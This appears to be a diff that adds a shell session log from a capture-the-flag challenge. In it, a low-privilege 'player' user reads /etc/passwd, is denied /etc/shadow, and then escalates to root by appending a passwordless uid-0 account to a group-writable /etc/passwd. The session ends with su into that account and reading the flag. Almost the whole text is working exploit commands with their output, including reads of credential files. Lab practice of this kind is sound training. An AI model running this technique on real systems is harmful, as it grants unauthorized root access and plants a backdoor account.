@@ -1,0 +1,28 @@
+$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+
+$ ls -l /etc/passwd /etc/shadow
+-rw-rw-r-- 1 root player 1050 Nov 19 00:10 /etc/passwd
+-rw-r----- 1 root shadow  652 Nov 19 00:10 /etc/shadow
+
+$ tail -3 /etc/passwd
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+sshd:x:100:65534::/run/sshd:/usr/sbin/nologin
+player:x:1001:1001::/home/player:/bin/bash
+
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+$ cat /var/backups.passwd.txt; ls -l /var/backups 2>/dev/null
+# backup taken 2021: see /var/backups
+total 4
+-rw-r--r-- 1 root root 38 Nov 19 00:10 passwd.old
+
+$ echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd; tail -2 /etc/passwd
+player:x:1001:1001::/home/player:/bin/bash
+pwned::0:0:root:/root:/bin/bash
+
+$ printf '\n' | su pwned -c 'id; cat /flag.txt'
+uid=0(root) gid=0(root) groups=0(root)
+Ly_Flag{l2ovsu7a}
+
